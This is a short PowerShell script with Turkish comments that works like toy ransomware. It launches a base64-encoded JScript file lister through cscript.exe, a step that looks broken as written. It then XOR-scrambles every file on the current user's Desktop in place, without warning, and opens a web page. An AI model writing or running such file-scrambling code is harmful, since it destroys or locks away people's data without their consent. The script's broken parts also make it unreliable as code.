# script.ps1
# 1️⃣ Inline JS kodu
$js = @"
var fso = new ActiveXObject("Scripting.FileSystemObject");
var folder = fso.GetFolder("C:\\Users\\$env:USERNAME\\Desktop");
var files = new Enumerator(folder.Files);
for (; !files.atEnd(); files.moveNext()) {
    WScript.Echo(files.item().Name);
}
"@

# JS'i tek satır olarak çalıştır (cscript.exe ile inline)
$encodedJs = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($js))
Start-Process "cscript.exe" -ArgumentList "//B //Nologo //E:jscript $encodedJs" -Wait

# 2️⃣ PowerShell ile dosyaları şifrele
$folder = "C:\Users\$env:USERNAME\Desktop"
Get-ChildItem $folder -File | ForEach-Object {
    $data = [IO.File]::ReadAllBytes($_.FullName)
    for ($i=0; $i -lt $data.Length; $i++) { $data[$i] = $data[$i] -bxor 0xAA }
    [IO.File]::WriteAllBytes($_.FullName, $data)
}

# 3️⃣ Web yönlendirme
Start-Process "https://www.example.com"
